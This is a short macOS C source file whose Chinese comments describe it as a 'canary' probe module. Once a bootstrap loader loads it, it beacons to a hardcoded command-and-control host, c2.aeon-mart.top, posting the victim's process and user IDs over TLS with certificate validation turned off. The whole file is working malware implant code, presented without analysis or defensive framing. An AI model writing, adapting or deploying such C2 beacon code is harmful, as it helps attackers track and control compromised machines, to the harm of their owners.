/*
 * entry1_canary.c — 探针：被 bootstrap 装载后立刻向 C2 发一次 /beacon
 * 导出 _process（与 bootstrap 的入口约定一致），发完即返回。
 */
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <dispatch/dispatch.h>
#include <CoreFoundation/CoreFoundation.h>
#include <CFNetwork/CFNetwork.h>

#define C2_HOST "c2.aeon-mart.top"
#define C2_PORT 443
#define PATH    "/beacon"
#define ROLE    "entry1-canary"

static int canary_post(void) {
    CFStringRef h = CFStringCreateWithCString(NULL, C2_HOST, kCFStringEncodingUTF8);
    CFHostRef host = CFHostCreateWithName(NULL, h);
    CFReadStreamRef rs = NULL;
    CFWriteStreamRef ws = NULL;
    CFStreamCreatePairWithSocketToCFHost(NULL, host, C2_PORT, &rs, &ws);
    CFRelease(host);
    CFRelease(h);
    if (!rs || !ws) return -1;

    const void *keys[] = { kCFStreamSSLValidatesCertificateChain };
    const void *vals[] = { kCFBooleanFalse };
    CFDictionaryRef ssl = CFDictionaryCreate(NULL, keys, vals, 1,
                                             &kCFTypeDictionaryKeyCallBacks,
                                             &kCFTypeDictionaryValueCallBacks);
    CFWriteStreamSetProperty(ws, kCFStreamPropertySSLSettings, ssl);
    CFReadStreamSetProperty(rs, kCFStreamPropertySSLSettings, ssl);
    CFRelease(ssl);

    if (!CFWriteStreamOpen(ws) || !CFReadStreamOpen(rs)) return -2;

    char body[256];
    int bl = snprintf(body, sizeof(body),
                      "{\"uuid\":\"canary-%d\",\"role\":\"%s\",\"pid\":%d,\"uid\":%d,\"status\":\"idle\"}",
                      (int)getpid(), ROLE, (int)getpid(), (int)getuid());

    char req[1024];
    int n = snprintf(req, sizeof(req),
                     "POST %s HTTP/1.0\r\nHost: %s\r\nContent-Type: application/json\r\n"
                     "Content-Length: %d\r\n\r\n%s", PATH, C2_HOST, bl, body);
    if (n <= 0 || n >= (int)sizeof(req)) return -3;

    CFIndex w = CFWriteStreamWrite(ws, (const UInt8 *)req, n);
    char buf[512];
    CFReadStreamRead(rs, (UInt8 *)buf, sizeof(buf) - 1);

    CFWriteStreamClose(ws); CFRelease(ws);
    CFReadStreamClose(rs); CFRelease(rs);
    return (int)w;
}

__attribute__((visibility("default")))
void _process(void) {
    dispatch_queue_t q = dispatch_queue_create("canary", NULL);
    dispatch_async(q, ^{
        canary_post();
    });
}
